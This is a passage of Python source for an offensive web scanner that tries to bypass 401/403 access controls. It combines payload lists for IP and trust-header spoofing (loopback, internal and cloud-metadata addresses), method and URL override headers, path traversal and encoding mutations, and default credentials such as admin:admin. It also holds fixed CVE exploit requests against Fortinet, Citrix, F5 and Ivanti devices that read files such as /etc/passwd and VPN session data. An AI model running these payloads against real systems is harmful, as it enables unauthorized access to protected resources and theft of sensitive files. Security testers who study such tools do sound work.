#!/usr/bin/env python3
"""
byp4xx.py — unified 40x/401/403 bypass scanner.

Merges the most effective techniques from:
  - nomore403  (devploit)
  - dontgo403  (mbrg)
  - 4-ZERO-3   (Dheerajmadhukar)
  - byp4xx     (lobuhi)

into a single dependency-light tool.

Usage:
    python3 byp4xx.py -u https://target.com/admin
    python3 byp4xx.py -u https://target.com/admin -t 40 --only-hits
    python3 byp4xx.py -l urls.txt -o results.txt
    python3 byp4xx.py -u https://target.com/admin -x http://127.0.0.1:8080 -k

Author: built for authorized security testing / bug bounty only.
"""

import argparse
import concurrent.futures
import csv
import io
import ipaddress
import json
import os
import posixpath
import random
import re
import sys
import time
import zipfile
from urllib.parse import urlparse, urlunparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[!] Missing dependency. Install with: pip install requests")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
class C:
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    R = "\033[91m"   # red
    B = "\033[94m"   # blue
    M = "\033[95m"   # magenta
    GR = "\033[90m"  # grey
    BOLD = "\033[1m"
    END = "\033[0m"

    @staticmethod
    def strip():
        for k in ("G", "Y", "R", "B", "M", "GR", "BOLD", "END"):
            setattr(C, k, "")


BANNER = r"""
 _                  _  _
| |__  _   _ _ __  | || |__  ____  __
| '_ \| | | | '_ \ | || |\ \/ /\ \/ /
| |_) | |_| | |_) ||__   _>  <  >  <
|_.__/ \__, | .__/    |_|/_/\_\/_/\_\
       |___/|_|   unified 40x bypass — byp4xx.py
"""


# ---------------------------------------------------------------------------
# Payload sets (the "most powerful" merged from the four tools)
# ---------------------------------------------------------------------------

# HTTP methods / verb tampering (dontgo403 + nomore403)
HTTP_METHODS = [
    "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
    "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
    "MOVE", "LOCK", "UNLOCK", "DEBUG", "TRACK", "PURGE", "FOO",
    "CATS", "INVENTED",  # arbitrary verbs sometimes bypass method-based ACLs
]

# Spoofed-IP values fed into the IP/host headers below.
# Includes alt-encodings of 127.0.0.1 that SSRF/ACL filters miss
# (decimal, hex, octal, shortened, IPv6-mapped, enclosed).
SPOOF_IPS = [
    "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "localhost",
    "0.0.0.0", "0", "0177.0.0.1", "0x7f.0.0.1", "127.000.000.001",
    "127.1", "127.0.1", "2130706433", "0x7f000001", "017700000001",
    "[::1]", "[::ffff:127.0.0.1]", "::1", "0000::1", "①②⑦.⓪.⓪.①",
    # extra 127.0.0.1 obfuscations seen bypassing ACL/WAF parsers
    "127.0.0.1.", "127.0.0.1%00", "127.0.0.1 ", "0x7f.0x0.0x0.0x1",
    "127。0。0。1", "127．0．0．1", "①27.0.0.1", "localhost.",
    "127.0.0.1#@evil.com", "127.0.0.1&@evil.com",
    "10.0.0.1", "192.168.0.1", "192.168.1.1", "172.16.0.1",
    "100.64.0.1", "169.254.169.254", "metadata.google.internal",
    "fd00:ec2::254",  # AWS IMDSv2 IPv6 link-local
    # 32-bit integer-overflow + dotted-hex forms that wrap to 127.0.0.1
    # (parsers using inet_aton/strtoul mod 2^32 accept these as loopback)
    "0x885aed3a587f000001", "281472812449793", "0x7f.0.0.0x1",
    "::ffff:7f00:0001", "0177.0.0.01", "127.0.0.0.1",
]

# Internal / reserved / cloud-metadata destinations fed into every IP trust
# header so a backend that grants access when the "client" looks internal is
# caught. High-signal internal-server pivots: docker bridge gw (172.17.0.1),
# k8s default service ClusterIP (10.96.0.1), AWS ECS task metadata
# (169.254.170.2), Alibaba metadata (100.100.100.200). The loopback/metadata
# entries already in SPOOF_IPS above are not repeated.
INTERNAL_IPS = [
    "127.0.0.2", "127.1", "10.0.0.0", "10.10.10.10", "172.17.0.1",
    "172.18.0.1", "192.168.0.0", "10.96.0.1", "169.254.170.2",
    "100.100.100.200",
]
SPOOF_IPS = list(dict.fromkeys(SPOOF_IPS + INTERNAL_IPS))

# IPs fired individually through the all-headers-at-once SHOTGUN and the
# PATH+IP combo. User-supplied --internal-ip values are prepended at runtime.
SHOTGUN_IPS = [
    "127.0.0.1", "localhost", "10.0.0.1", "172.17.0.1", "192.168.0.1",
    "192.168.1.1", "169.254.169.254", "169.254.170.2", "10.96.0.1",
    "100.64.0.1",
]
COMBO_IPS = ["127.0.0.1", "169.254.169.254", "172.17.0.1"]

# Trust headers a geo / edge ACL typically reads to decide the client's
# country. GEO-SPOOF sets all of them to the same in-country IP per request so
# whichever the backend honours wins — you only need ONE IP to pass the geo gate.
GEO_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP",
    "CF-Connecting-IP", "Fastly-Client-IP", "X-Forwarded", "Client-IP",
    "X-Originating-IP", "Forwarded-For", "X-Remote-IP",
]


# ---------------------------------------------------------------------------
# Geo IP source — iplocate ip-to-country DB (CSV or the shipped .csv.zip).
# Format-tolerant: auto-detects the country-code column and whether ranges are
# CIDR, dotted start/end, or integer start/end. One representative IP per
# matching range, capped per country.
#   grab it:  https://github.com/iplocate/ip-address-databases (ip-to-country)
# ---------------------------------------------------------------------------
# ccTLD -> ISO country code. Most ccTLDs equal their ISO code (.tn->TN,
# .fr->FR); only the handful that differ are overridden. gTLDs (.com/.org/...)
# return None -> no geo auto-selection.
TLD_COUNTRY = {"uk": "GB", "su": "RU", "ac": "SH", "an": "NL", "yu": "RS"}
_GENERIC_TLDS = {"com", "org", "net", "edu", "gov", "mil", "int", "info",
                 "biz", "app", "dev", "io", "co", "xyz", "online", "site",
                 "tech", "cloud", "ai"}


def country_from_host(host):
    """ISO country code inferred from the host's ccTLD, or None."""
    tld = host.rsplit(".", 1)[-1].lower()
    if tld in TLD_COUNTRY:
        return TLD_COUNTRY[tld] or None
    if tld in _GENERIC_TLDS:
        return None
    if len(tld) == 2 and tld.isalpha():
        return tld.upper()
    return None


def _host_of(u):
    return (urlparse(u if "://" in u else "https://" + u).hostname or u).lower()


def _rep_ip_from_cidr(net):
    try:
        n = ipaddress.ip_network(net, strict=False)
        return str(n.network_address + 1) if n.num_addresses > 2 \
            else str(n.network_address)
    except ValueError:
        return None


def _row_rep_ip(fields):
    """First usable IP from a CSV row: prefer a CIDR field, else the first
    address-like field (dotted/colon literal or integer form)."""
    for f in fields:
        if isinstance(f, str) and "/" in f:
            ip = _rep_ip_from_cidr(f)
            if ip:
                return ip
    for f in fields:
        s = str(f).strip()
        if not s:
            continue
        if s.isdigit() and len(s) > 3:
            try:
                return str(ipaddress.ip_address(int(s)))
            except (ValueError, ipaddress.AddressValueError):
                continue
        try:
            ipaddress.ip_address(s)
            return s
        except ValueError:
            continue
    return None


def _open_geo_rows(path):
    p = os.path.expanduser(path)
    if p.endswith(".zip"):
        with zipfile.ZipFile(p) as z:
            name = next((n for n in z.namelist() if n.endswith(".csv")), None)
            if not name:
                return
            with z.open(name) as fh:
                for row in csv.reader(io.TextIOWrapper(fh, "utf-8", "ignore")):
                    yield row
    else:
        with open(p, encoding="utf-8", errors="ignore") as fh:
            for row in csv.reader(fh):
                yield row


def load_geo_ips(db_path, countries, limit):
    """Return a list of representative IPs for the requested ISO country codes,
    up to `limit` per country, sampled across the DB's ranges."""
    want = {c.strip().upper() for c in countries if c.strip()}
    if not want:
        return []
    per = {c: 0 for c in want}
    out = []
    for fields in _open_geo_rows(db_path):
        cc = None
        for f in fields:
            if isinstance(f, str) and len(f) == 2 and f.isalpha() \
                    and f.upper() in want:
                cc = f.upper()
                break
        if not cc or per[cc] >= limit:
            continue
        ip = _row_rep_ip(fields)
        if ip:
            out.append(ip)
            per[cc] += 1
        if all(per[c] >= limit for c in want):
            break
    return list(dict.fromkeys(out))

# Headers used for IP / origin / auth spoofing (merged 4-ZERO-3 + nomore403)
IP_HEADERS = [
    "X-Forwarded-For", "X-Forwarded", "X-Forwarded-Host",
    "X-Forwarded-Server", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "Forwarded-For", "Forwarded", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Real-IP", "X-Host",
    "X-Custom-IP-Authorization", "Client-IP", "True-Client-IP",
    "Cluster-Client-IP", "X-ProxyUser-Ip", "Via", "X-Backend-Server",
    "X-Original-Remote-Addr", "X-Server-IP",
    # cloud / CDN trust headers seen bypassing edge ACLs in writeups
    "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
    "X-Azure-SocketIP", "X-AppEngine-User-IP",
    "X-AppEngine-Trusted-IP-Request", "X-WAP-Profile", "X-Arbitrary",
    "X-Forwarded-For-Original", "X-Real-Ip", "X-True-IP",
    # more trust/forwarding headers from nomore403 + akamai/incapsula notes
    "X-Forwarded", "X-Forward-For", "X-Forwarded-By", "X-Cluster-Client-IP",
    "X-Original-Forwarded-For", "Incap-Client-IP", "True-Client-Ip",
    "X-Akamai-Edgescape", "WL-Proxy-Client-IP", "Proxy-Client-IP",
    "Z-Forwarded-For", "X-Coming-From", "Base-Url", "Http-Url",
    "Profile", "X-Forwarded-Server",
    # backend / gateway / origin-host trust headers (Forbidden-Buster + BF)
    "X-Original-Host", "X-Original-IP", "X-Backend-Host", "X-Gateway-Host",
    "X-Client-Host", "Source-IP", "X-From-IP", "X-From", "X-Ip",
    "X-ProxyMesh-IP", "Proxy-Host", "Forwarded-For-Ip", "X-Forwarder-For",
    "Clientip", "X-Forward-Proto", "X-Cache-Info", "X-BlueCoat-Via",
    "Remote-Addr", "Remote-Host", "X-Forwared-Host", "X-Originally-Forwarded-For",
    # mutated header NAME with appended path-break — some ACLs key on a
    # normalised header name yet the WAF/proxy stores it under the raw name,
    # so the deny rule misses it (intrudir/BypassFuzzer trick).
    "X-Custom-IP-Authorization..;/", "X-Custom-IP-Authorization..;",
]

# Method-override headers — framework re-dispatches the verb server-side,
# bypassing method-based ACLs (Spring, Symfony, Rails, .NET). Big modern win.
METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
    "_method",
]

# Host header swap values (vhost / internal routing bypass)
HOST_VALUES = ["localhost", "127.0.0.1", "internal", "intranet",
               "localhost:443", "127.0.0.1:80"]

# Headers that rewrite the requested URL/path server-side (the big winners).
# X-Original-URL / X-Rewrite-URL = IIS + Symfony; route to protected path
# while request-line points at an allowed one.
URL_OVERRIDE_HEADERS = [
    "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-Http-Destinationurl", "X-Forwarded-Path", "X-Original-Path",
    "Request-Uri", "X-Default-Path", "X-Original-Uri", "X-Forwarded-Uri",
    # more URL-rewrite headers (BypassFuzzer template set)
    "X-HTTP-DestinationURL", "X-Proxy-Url", "Uri", "Url", "Path",
    "Content-Location", "Destination", "X-Rewrite-Url",
]

# X-Forwarded-Prefix — Spring Boot / reverse-proxy prefix-strip bypass.
# Classic actuator bypass: GET /;/actuator with X-Forwarded-Prefix.
# (X-Original-URL handled by URL_OVERRIDE_HEADERS — not duplicated here.)
PREFIX_HEADERS = ["X-Forwarded-Prefix", "X-Forwarded-Path-Prefix",
                  "X-Real-URI"]

# Scheme / proto override values
SCHEME_VALUES = ["http", "https", "On", "on", "ssl"]

# X-Forwarded-Port values — backend sometimes grants internal trust by port.
PORT_VALUES = ["80", "443", "4443", "8000", "8080", "8443", "9443"]

# Authorization / auth-context headers to try (each sent alone).
AUTH_HEADERS = [
    ("Authorization", "Basic Og=="),            # ":" empty creds
    ("Authorization", "Basic YWRtaW46YWRtaW4="),  # admin:admin
    ("Authorization", "Basic YWRtaW46"),         # admin:
    ("Authorization", "Bearer null"),
    ("Authorization", "Bearer undefined"),
    ("Authorization", "Bearer 0"),
    ("Authorization", "null"),
    ("X-Requested-With", "XMLHttpRequest"),       # some ACLs allow XHR
    ("Content-Type", "application/json"),
    ("X-Original-URL", "/"),                      # reset path to allowed root
]

# Path mutation payloads. end-path tricks are appended to the path.
PATH_SUFFIXES = [
    "", "/", "//", "/.", "/./", "/%2e/", "/..;/", "/..%2f", "/..%00/",
    "/.randomstring", "/?", "/??", "/#", "/.json", "/.css", "/.html",
    "/.php", "/..;", "/;/", "/.;/", "/%20", "/%09", "/%00", "/*",
    "/%2f/", "/%252f/", "?.css", "?.json", "#", "..;/", ";", ";/",
    ".json", "%20", "%09", "%00", "/..%2F..%2F", "/.%2e/",
    # modern: backslash (IIS/.NET => /), fullwidth unicode, double-encode
    "\\", "/\\", "%5c", "/%5c", "/..%5c", "%c0%af", "/%c0%af",
    "%e0%80%af", "/%252e/", "/%252f", "/%bg%qf", "/%u002e/",
    "/%uff0e/", "/%uff0f", "/%ef%bc%8f",  # fullwidth slash UTF-8
    ";/../", "/..;/..;/", "/.//", "/.//./", "/%2e%2e%2f",
    "?", "&", "/%3f", "/%23", "/%26", "/.%00", "/%0a", "/%0d%0a",
    ".", "...", "/...", "//.", "/index.html", "/.//index.html",
    # nginx merge-slash + trailing variants
    "/.//", "//../", "/%2e", "/%2e%2e", "/%2f.", "/./.", "/ ", "/\t",
    # double/triple URL-encode of dot & slash (WAF decode-once bypass)
    "/%25%32%65/", "/%25%32%66/", "/%2525%32%65/", "/..%c0%af",
    "/..%e0%80%af", "/%c0%ae/", "/%e0%80%ae/",
    # tab/newline injected mid-suffix, semicolon empty-param
    "/%09/", "/%0d/", "/%0a/", "/;", "/;a=b", "/.json/", "/?a=b",
    # IIS short-name / ASP tricks
    "/*~1", "::$DATA", "/..%255c", "%3f/", "%23/",
    # overlong-UTF8 CRLF that some parsers fold to \n / \r mid-path,
    # plus Tomcat ;-matrix + double-encoded dot-semicolon (BypassFuzzer set)
    "/%E5%98%8A", "/%E5%98%8D", "%E5%98%8A", "%E5%98%8D",
    "/%2e%3b/", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%2e%2e%3b/",
    "/;x", ";x", "/x/..;/", "/x/../", "/x;/..", "%c0%af.", "/%c0%af.%c0%af",
    "/..;%2f..;%2f", "/%u002e/%u002e", "/%uff0e%uff0e/",
]

PATH_PREFIXES = [
    "", "/", "//", "/./", "/%2e/", "/%2f", "/;/", "/.;/", "/..;/",
    "/;foo=bar/..", "/%2e%2e/", "/..%2f", "/%2f%2f",
    # modern prefixes
    "/%09", "/%20", "/\\", "/%5c", "/..%5c", "/%252f", "/.%2f",
    "/;/..", "/..;/", "/%u002f", "/%uff0f", "/web/../",
    # leading dot-segments + encoded traversal that resolve back to the path
    "/./../", "/.//", "/%2e%2e%2f", "/%252e%252e%252f", "/..%00/",
    "/..%0d/", "/..%5c..%5c", "/%c0%af", "/..;/..;/", "/#/../",
    # gateway/proxy prefix-strip lead-ins
    "/api/..", "/v1/..", "/public/..", "/static/..", "/..%2f..%2f",
]

# Wrappers applied to the *last segment* of the path (4-ZERO-3 style)
SEGMENT_WRAPPERS = [
    "{S}", "%2e/{S}", "{S}/.", "//{S}//", "/./{S}/./",
    "{S}%20", "{S}%09", "{S}%00", "{S}.json", "{S}..;/", "{S};/",
    "{S}/", "/{S}/", "{S}?", "{S}#", "{S}%2f", "{S}/..;/",
    "{S}.html", "{S}.php", "{S}~", "{S}/~",
    # modern segment tricks
    "{S}%23", "{S}%3f", "{S}\\", "{S}%5c", "{S};", "{S};foo=bar",
    "{S}%252f", "{S}%00.json", "{S}.", "{S}..;", "{S}%c0%af",
    "{S}%uff0f", "{S}/..;/{S}", "{S}/.",
]

# Matrix / path-parameter injections appended before last segment.
# Tomcat & Spring strip everything after ';' for routing but ACL sees raw.
MATRIX_PARAMS = [";", ";/", ";jsessionid=1", ";foo=bar",
                 ";/..", "/.;/", "/..;/", "%3b", "%3b/"]

# Default UA — fixed (deterministic) so length-diffing and reproducibility
# hold. Override with --ua.
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

# UA-bypass pool — each is tried as an EXPLICIT labeled job (not random),
# so a Googlebot/internal-crawler bypass is reproducible and attributed.
USER_AGENTS = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "curl/8.5.0",
]


# Novel / modern bypass headers (2023-2025 writeups). Each sent alone.
# These are the "unique" additions not present in the four merged tools.
NOVEL_HEADERS = [
    # Next.js CVE-2025-29927: subrequest header skips middleware auth gate.
    ("X-Middleware-Subrequest", "middleware"),
    ("X-Middleware-Subrequest", "src/middleware"),
    ("X-Middleware-Subrequest",
     "middleware:middleware:middleware:middleware:middleware"),
    # Spring prefix collapse / actuator
    ("X-Forwarded-Prefix", "/.."),
    ("X-Forwarded-Prefix", "/;"),
    # TLS 0-RTT early-data: some edges short-circuit auth on replayed 0-RTT
    ("Early-Data", "1"),
    # Akamai debug / cache-key surface (info + occasional ACL skip)
    ("Pragma", "akamai-x-get-cache-key"),
    ("Pragma", "akamai-x-get-true-cache-key"),
    ("X-Akamai-A2-Trace", "on"),
    # nginx X-Accel internal redirect — app trusts header to serve internal file
    ("X-Sendfile-Type", "X-Accel-Redirect"),
    ("X-Accel-Redirect", "/internal"),
    # Apache/IIS internal-only trust headers
    ("X-Forwarded-Host", "localhost"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-HTTP-Host-Override", "localhost"),
    # Profile/Destination quirks (WebDAV / proxy)
    ("Destination", "/"),
    ("Max-Forwards", "0"),
]

# Real, documented network-appliance / WAF-gateway auth-bypass CVEs that reduce
# to a header set or a fixed request path. Each is CVE-labeled so a hit is
# verifiable. NOTE: Cloudflare / Akamai / generic cloud WAFs are NOT here —
# those have no header-CVE bypass; you beat them with origin-IP discovery or
# payload encoding, not a magic header. Sent as GET probes (detection, not
# exploitation).
CVE_HEADER_JOBS = [
    # FortiOS / FortiProxy / FortiWeb admin auth bypass — trusted-source spoof
    ("CVE-2022-40684", {
        "User-Agent": "Report Runner",
        "Forwarded": 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000"',
    }),
    # F5 BIG-IP iControl REST auth bypass — Connection-header token smuggle
    ("CVE-2022-1388", {
        "Connection": "keep-alive, X-F5-Auth-Token",
        "X-F5-Auth-Token": "0",
        "Authorization": "Basic YWRtaW46",
        "Host": "localhost",
    }),
]

# Fixed auth-bypass / traversal request paths for known appliance CVEs. Fired
# against the target's scheme+host root.
CVE_PATH_JOBS = [
    # Fortinet SSL-VPN path traversal (session file read)
    ("CVE-2018-13379",
     "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"),
    # Citrix ADC/Gateway directory traversal
    ("CVE-2019-19781", "/vpn/../vpns/cfg/smb.conf"),
    # F5 BIG-IP TMUI auth bypass via ..;/ (file read)
    ("CVE-2020-5902",
     "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"),
    # Ivanti Connect Secure auth bypass (dot-segment)
    ("CVE-2023-46805",
     "/api/v1/totp/user-backup-code/../../system/system-information"),
]

# Substrings that mark a deny / block / WAF / login page. If a candidate's
# body contains these AND the baseline was a deny, the "200" is almost
# certainly a soft-block or login wall, not real resource access -> penalised.
WAF_SIGNATURES = (
    "access denied", "access is denied", "request blocked",
    "request unsuccessful", "you don't have permission",
    "you do not have permission", "not authorized", "unauthorized",
    "forbidden", "403 forbidden", "401 unauthorized", "attention required",
    "blocked by", "security policy", "mod_security", "modsecurity",
    "web application firewall", "incapsula incident", "cloudflare",
    "captcha", "are you a robot", "ray id", "reference #", "support id",
    "akamai", "the requested url was rejected",
)
# Softer markers — a login/SSO wall. Penalised less (sometimes the real
# resource legitimately is a login page), but still a confidence drag.
LOGIN_SIGNATURES = (
    "sign in", "log in", "login", "password", "username",
    "authenticate", "single sign-on", "sso", "two-factor",
)


# ---------------------------------------------------------------------------
# Content fingerprinting (Jaccard over volatile-stripped token shingles).
# Compares response BODIES semantically so WAF/soft-block pages whose byte
# length jitters are still recognised as "the deny page", and dynamic pages
# of coincidentally-equal length are not mistaken for each other.
# ---------------------------------------------------------------------------
_VOLATILE = re.compile(r"[0-9a-f]{6,}|\d+|&#?\w+;|\s+", re.I)
_TAGSTRIP = re.compile(r"<[^>]+>")


def _shingles(text):
    """Token-set fingerprint with volatile tokens (ids, csrf, timestamps,
    hex, entities) stripped so they don't perturb the similarity score."""
    if not text:
        return frozenset()
    t = _TAGSTRIP.sub(" ", text.lower())
    t = _VOLATILE.sub(" ", t)
    toks = [x for x in t.split() if len(x) > 2]
    return frozenset(toks[:4000])


def _jaccard(a, b):
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    union = len(a | b)
    return (len(a & b) / union) if union else 0.0


def _has_sig(text, sigs):
    if not text:
        return False
    low = text[:20000].lower()
    return any(s in low for s in sigs)


def _latin1_ok(s):
    """True if the value is sendable as an HTTP header (latin-1 encodable)."""
    try:
        s.encode("latin-1")
        return True
    except (UnicodeEncodeError, AttributeError):
        return False


# RFC 7230 field-name token. Names with ';' '/' '..' (the deliberately
# malformed ACL-trick headers) are NOT tokens — safe to send ALONE, but a
# real origin/WAF may 400 a whole request that carries one, so they must be
# kept out of the combined IP-SHOTGUN probe.
_TOKEN_NAME = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")


def _token_name_ok(name):
    return bool(_TOKEN_NAME.match(name or ""))


# ---------------------------------------------------------------------------
# External payload corpus loader. Lets byp4xx ingest any BypassFuzzer- /
# Forbidden-Buster-style wordlist so the corpus grows without code changes.
# Looks in ~/.byp4xx by default (auto-bundled high-signal lists live there):
#   url_payloads.txt  -> path mutation suffixes
#   ip_payloads.txt   -> spoofed-IP header/path values
#   ip_headers.txt    -> trust/forwarding header NAMES
# ---------------------------------------------------------------------------
def _load_lines(path):
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [ln.rstrip("\n") for ln in f
                    if ln.strip() and not ln.lstrip().startswith("#")]
    except OSError:
        return []


def load_external_payloads(dirpath):
    """Merge external wordlists into the in-memory payload sets (dedup,
    order-preserving). Returns a stats dict, or None if dir is absent."""
    global SPOOF_IPS, IP_HEADERS, PATH_SUFFIXES
    d = os.path.expanduser(dirpath or "")
    if not d or not os.path.isdir(d):
        return None
    stats = {}

    up = _load_lines(os.path.join(d, "url_payloads.txt"))
    if up:
        merged = list(dict.fromkeys(PATH_SUFFIXES))
        seen = set(merged)
        for p in up:
            for cand in (p, p if p.startswith("/") else "/" + p):
                if cand not in seen:
                    merged.append(cand)
                    seen.add(cand)
        PATH_SUFFIXES = merged
        stats["url_payloads"] = len(up)

    ip = _load_lines(os.path.join(d, "ip_payloads.txt"))
    if ip:
        SPOOF_IPS = list(dict.fromkeys(list(SPOOF_IPS) + ip))
        stats["ip_payloads"] = len(ip)

    hd = _load_lines(os.path.join(d, "ip_headers.txt"))
    if hd:
        seen = {h.lower() for h in IP_HEADERS}
        merged = list(IP_HEADERS)
        for h in hd:
            if h and h.lower() not in seen:
                merged.append(h)
                seen.add(h.lower())
        IP_HEADERS = merged
        stats["ip_headers"] = len(hd)

    return stats


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
class Byp4xx:
    def __init__(self, args):
        self.args = args
        self.session = self._build_session()
        self.baseline = None        # (status, length)
        self.baseline_stable = True
        self.deny_len = None        # body length of the deny page, if any
        self.deny_codes = args.deny_codes
        self.results = []
        self.json_results = []
        self._429_streak = 0        # consecutive rate-limits -> auto-backoff

    def _build_session(self):
        s = requests.Session()
        retry = Retry(total=1, backoff_factor=0.2,
                      status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=100,
                              pool_maxsize=100)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        if self.args.proxy:
            s.proxies = {"http": self.args.proxy, "https": self.args.proxy}
        return s

    def _extra_headers(self):
        h = {}
        if self.args.header:
            for raw in self.args.header:
                if ":" in raw:
                    k, v = raw.split(":", 1)
                    h[k.strip()] = v.strip()
        return h

    def _request(self, url, method="GET", headers=None):
        hdr = {"User-Agent": self.args.ua or DEFAULT_UA}
        hdr.update(self._extra_headers())
        if headers:
            hdr.update(headers)

        # Build + send manually so we can defeat requests' URL requoting,
        # which otherwise normalises away path payloads (/..%2f, \, %c0%af,
        # %252f, ;-params). Overwriting prep.url after prepare keeps raw bytes
        # in the request line; prep.method override keeps verb case (get/GeT).
        for attempt in range(self.args.retries + 1):
            try:
                req = requests.Request(method, url, headers=hdr)
                prep = self.session.prepare_request(req)
                prep.url = url
                prep.method = method
                r = self.session.send(
                    prep, timeout=self.args.timeout,
                    allow_redirects=False, verify=not self.args.insecure,
                )
            except (requests.exceptions.RequestException,
                    UnicodeError, ValueError) as e:
                # ValueError/UnicodeError: e.g. non-latin-1 header value
                # (fullwidth-unicode spoof IP) or malformed URL — skip, no crash
                return None, 0, str(e)

            if r.status_code == 429 and attempt < self.args.retries:
                self._429_streak += 1
                ra = r.headers.get("Retry-After", "")
                wait = float(ra) if ra.isdigit() else max(self.args.delay * 4, 2)
                # global slow-down so we don't get the source IP banned
                time.sleep(min(wait + self._429_streak, 15))
                continue

            self._429_streak = max(0, self._429_streak - 1)
            if self.args.delay:
                time.sleep(self.args.delay + random.random() * self.args.delay)
            return r.status_code, len(r.content), r

        return r.status_code, len(r.content), r

    @staticmethod
    def _text(r):
        """Best-effort response body as text, capped, '' on anything weird."""
        if not hasattr(r, "text"):
            return ""
        try:
            return r.text[:200000]
        except Exception:
            return ""

    def _fp(self, r):
        """(shingle-set, raw-text-snippet) fingerprint of a response body."""
        t = self._text(r)
        return _shingles(t), t

    def _body_similar(self, sh_a, sh_b):
        """True if two body fingerprints are the 'same page' (Jaccard high)."""
        if not sh_a or not sh_b:
            return False
        return _jaccard(sh_a, sh_b) >= self.args.sim_threshold

    # -- baseline -----------------------------------------------------------
    def set_baseline(self, url):
        # sample twice: catch flapping endpoints that would spew false hits
        s1, l1, r1 = self._request(url, "GET")
        s2, l2, _ = self._request(url, "GET")
        self.baseline = (s1, l1)
        self.baseline_stable = (s1 == s2 and abs(l1 - l2) <= max(16, int(l1 * 0.02)))
        self.base_sh, base_txt = self._fp(r1)
        # remember the deny-page body (size + content fingerprint) so a
        # soft-block (200 + block page) is not mistaken for a bypass even if
        # its byte length jitters between requests
        if s1 in self.deny_codes:
            self.deny_len = l1
            self.deny_sh = self.base_sh
        else:
            self.deny_len = None
            self.deny_sh = frozenset()

        # Reference response for the site ROOT. URL-override / prefix-header
        # jobs request "/" and rely on a header to re-route to the protected
        # path; if the server ignores the header it just serves the homepage.
        # Capturing root lets us suppress that whole false-positive class.
        parsed = urlparse(url)
        self.root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        self.target_path = (parsed.path or "/").rstrip("/") or "/"
        if (parsed.path or "/").rstrip("/") in ("", "/"):
            self.root_ref = self.baseline
            self.root_sh = self.base_sh
        else:
            rs, rl, rr = self._request(self.root, "GET")
            self.root_ref = (rs, rl)
            self.root_sh, _ = self._fp(rr)

        # CATCH-ALL CONTROL: request a random sibling path that cannot exist.
        # SPAs / catch-all routers answer 200 with the app shell for ANY path,
        # so a mutated path returning that same shell is NOT a bypass. Record
        # its (status, len) fingerprint to suppress that whole FP class.
        rnd = "byp4xx-" + "".join(random.choice("abcdefghijklmnop0123456789")
                                  for _ in range(14))
        base_dir = self.target_path.rsplit("/", 1)[0] or ""
        ctrl_url = urlunparse((parsed.scheme, parsed.netloc,
                               f"{base_dir}/{rnd}", "", "", ""))
        cs, cl, cr = self._request(ctrl_url, "GET")
        self.ctrl_ref = (cs, cl)
        self.ctrl_sh, _ = self._fp(cr)

        warn = "" if self.baseline_stable else f"  {C.Y}(UNSTABLE: {s2}/{l2}b){C.END}"
        print(f"{C.GR}[baseline] {url} -> {s1} ({l1} bytes)  "
              f"[root {self.root_ref[0]}/{self.root_ref[1]}b  "
              f"catch-all {cs}/{cl}b]{C.END}{warn}")

    def _len_close(self, a, b):
        if a is None or b is None:
            return False
        return abs(a - b) <= max(16, int(b * 0.02))

    def _interesting(self, status, length, url=None, method="GET", loc="",
                     sh=frozenset()):
        """True only when the mutation plausibly defeated the control:
        reached a non-deny 2xx/3xx whose body isn't the deny page again.
        Soft-403s (200 + block page), homepage echoes (fragment truncation /
        ignored override headers), normaliser redirects that bounce back to
        the protected path, and 4xx/5xx noise are filtered. When a body
        fingerprint (sh) is supplied, content similarity is used IN ADDITION
        to byte-length so block/soft-deny pages whose length jitters are still
        recognised as the deny page."""
        if status is None:
            return False
        bstat, blen = self.baseline if self.baseline else (None, None)
        if status in self.deny_codes:
            return False
        # OPTIONS/2xx with no body is a CORS preflight, not resource access
        if method.upper() == "OPTIONS" and 200 <= status < 300 and length == 0:
            return False
        # Content soft-block: body is the same page as the deny response even
        # though length differs (dynamic WAF block page). Pure content kill.
        if sh and getattr(self, "deny_sh", None) and \
                self._body_similar(sh, self.deny_sh):
            return False
        # Homepage echo: response is the site root -> SPA catch-all / ignored
        # override header, not the resource. When we have a body fingerprint,
        # CONTENT decides (a real resource whose length coincidentally equals
        # the homepage but whose body differs must NOT be dropped); length is
        # only the fallback when there's no body to compare (HEAD / empty).
        if (getattr(self, "root_ref", None) and self.target_path != "/"):
            rs, rl = self.root_ref
            if sh and getattr(self, "root_sh", None):
                if self._body_similar(sh, self.root_sh):
